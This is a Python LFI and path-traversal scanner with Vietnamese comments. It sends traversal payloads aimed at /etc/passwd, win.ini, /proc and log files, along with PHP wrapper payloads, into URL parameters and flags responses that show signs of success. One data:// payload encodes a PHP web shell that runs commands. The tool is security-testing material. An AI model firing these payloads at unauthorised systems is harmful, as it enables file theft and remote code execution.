"""
lfi.py - Local File Inclusion / Path Traversal scanner
Phát hiện LFI trong params như ?file=, ?page=, ?include=, ?path=
"""
import httpx
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console

console = Console()

# LFI params thường gặp
LFI_PARAM_NAMES = {
    "file", "page", "include", "path", "doc", "document",
    "folder", "root", "pg", "style", "pdf", "template",
    "php_path", "filepath", "filename", "load", "read",
    "lang", "language", "locale", "module", "section", "view",
}

# Path traversal payloads
LFI_PAYLOADS = [
    # Linux
    ("../../../etc/passwd",                          "linux"),
    ("../../../../etc/passwd",                       "linux"),
    ("../../../../../etc/passwd",                    "linux"),
    ("../../../../../../etc/passwd",                 "linux"),
    ("/etc/passwd",                                  "linux"),
    ("....//....//....//etc/passwd",                "linux"),  # Double slash bypass
    ("..%2F..%2F..%2Fetc%2Fpasswd",                "linux"),  # URL encoded
    ("..%252F..%252F..%252Fetc%252Fpasswd",        "linux"),  # Double encoded
    ("%2F..%2F..%2F..%2Fetc%2Fpasswd",             "linux"),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "php_wrapper"),
    ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "php_wrapper"),
    ("php://input",                                  "php_wrapper"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "php_data"),
    # Windows
    ("..\\..\\..\\windows\\win.ini",               "windows"),
    ("..\\..\\..\\..\\windows\\win.ini",           "windows"),
    ("/windows/win.ini",                             "windows"),
    ("C:\\windows\\win.ini",                        "windows"),
    # /proc
    ("/proc/self/environ",                           "linux_proc"),
    ("/proc/version",                               "linux_proc"),
    # Log injection
    ("/var/log/apache2/access.log",                "log"),
    ("/var/log/nginx/access.log",                  "log"),
]

# Indicators xác nhận LFI thành công
LFI_LINUX_INDICATORS = [
    "root:x:0:0",
    "bin:x:1:1",
    "daemon:x:2:2",
    "/bin/bash",
    "/bin/sh",
    "/sbin/nologin",
]

LFI_WINDOWS_INDICATORS = [
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
    "MAPI=1",
]

LFI_PHP_INDICATORS = [
    # base64 của /etc/passwd content
    "cm9vdDp4OjA6",  # base64("root:x:0:")
    "<?php",
]

LFI_PROC_INDICATORS = [
    "Linux version",
    "HTTP_",
    "DOCUMENT_ROOT",
    "SERVER_ADDR",
]


class LFIScanner:
    def __init__(self, timeout: int = 10, config: dict | None = None):
        self.timeout = timeout
        self.config  = config or {}

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _detect_lfi(self, response_text: str, payload_type: str) -> tuple[bool, str, float]:
        """Kiểm tra response có dấu hiệu LFI."""

        if payload_type == "linux":
            for indicator in LFI_LINUX_INDICATORS:
                if indicator in response_text:
                    return True, f"LFI confirmed: /etc/passwd content detected ('{indicator}')", 0.97

        elif payload_type == "windows":
            for indicator in LFI_WINDOWS_INDICATORS:
                if indicator in response_text:
                    return True, f"LFI confirmed: Windows win.ini content detected ('{indicator}')", 0.97

        elif payload_type == "php_wrapper":
            for indicator in LFI_PHP_INDICATORS:
                if indicator in response_text:
                    return True, f"PHP wrapper LFI: base64-encoded /etc/passwd in response", 0.95
            # PHP filter thường trả base64 blob dài
            if re.search(r"[A-Za-z0-9+/]{100,}={0,2}", response_text):
                return True, "PHP filter wrapper: large base64 blob in response", 0.75

        elif payload_type == "php_data":
            if "<?php" in response_text or "system(" in response_text:
                return True, "PHP data:// wrapper executed PHP code", 0.99

        elif payload_type == "linux_proc":
            for indicator in LFI_PROC_INDICATORS:
                if indicator in response_text:
                    return True, f"LFI via /proc: '{indicator}' found in response", 0.90

        elif payload_type == "log":
            # Log file thường chứa IP addresses + HTTP methods
            if re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET|POST", response_text):
                return True, "LFI via log file: access log content detected", 0.85

        return False, "", 0.0

    async def scan_url(self, url: str, client: httpx.AsyncClient) -> list[dict]:
        results = []
        parsed  = urlparse(url)
        params  = parse_qs(parsed.query)
        if not params:
            return results

        # Chỉ test params có tên suspicious
        candidate_params = [
            p for p in params.keys()
            if p.lower() in LFI_PARAM_NAMES
        ]
        if not candidate_params:
            return results

        for param in candidate_params:
            found = False
            for payload, ptype in LFI_PAYLOADS:
                if found:
                    break
                test_url = self._inject(url, param, payload)
                try:
                    resp = await client.get(test_url)
                    hit, evidence, confidence = self._detect_lfi(resp.text, ptype)
                    if hit:
                        console.print(
                            f"  [red bold][LFI][/red bold] {url} | "
                            f"param={param} | type={ptype}"
                        )
                        results.append({
                            "type":        "Local File Inclusion / Path Traversal",
                            "severity":    "CRITICAL",
                            "url":         url,
                            "parameter":   param,
                            "payload":     payload,
                            "evidence":    evidence,
                            "confidence":  confidence,
                            "cvss_score":  9.1,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                            "cwe":         "CWE-22",
                        })
                        found = True
                except Exception:
                    pass

        return results